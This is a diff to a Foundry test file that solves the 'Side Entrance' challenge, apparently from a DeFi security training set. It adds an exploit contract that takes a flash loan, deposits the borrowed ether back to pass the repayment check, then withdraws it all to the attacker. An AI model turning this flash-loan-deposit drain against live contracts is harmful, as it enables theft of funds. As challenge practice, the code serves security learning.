@@ -3,8 +3,46 @@ pragma solidity >=0.8.0;
 
 import {Utilities} from "../../utils/Utilities.sol";
 import "forge-std/Test.sol";
+import {console2} from "forge-std/console2.sol";
 
 import {SideEntranceLenderPool} from "../../../src/Contracts/side-entrance/SideEntranceLenderPool.sol";
+
+interface IFlashLoanEtherReceiver {
+    function execute() external payable;
+}
+
+contract ExploitContract is IFlashLoanEtherReceiver {
+    uint256 internal constant _ETHER_IN_POOL = 1_000e18;
+    SideEntranceLenderPool public target;
+    address public owner;
+
+    constructor(address payable _target) {
+        target = SideEntranceLenderPool(payable(_target));
+        owner = msg.sender;
+    }
+
+    function attack1() public {
+        console2.log("attack1");
+        target.flashLoan(_ETHER_IN_POOL);
+        console2.log("flashLoanDone:", address(this).balance);
+
+        console2.log("deposit done");
+    }
+
+    function attack2() public {
+        target.withdraw();
+    }
+
+    function execute() external payable {
+        target.deposit{value: _ETHER_IN_POOL}();
+    }
+
+    receive() external payable {
+        uint256 eth = address(this).balance;
+        (bool success,) = payable(owner).call{value: eth}("");
+        require(success, "Ether Not Sent Back to Owner");
+    }
+}
 
 contract SideEntrance is Test {
     uint256 internal constant _ETHER_IN_POOL = 1_000e18;
@@ -36,7 +74,11 @@ contract SideEntrance is Test {
         /**
          * EXPLOIT START *
          */
+        vm.startPrank(_attacker);
 
+        ExploitContract exploiter = new ExploitContract(payable(address(_sideEntranceLenderPool)));
+        exploiter.attack1();
+        exploiter.attack2();
         //What do we know
         // LenderPool has 1_000e18 ether
         // our attacker is users[0]
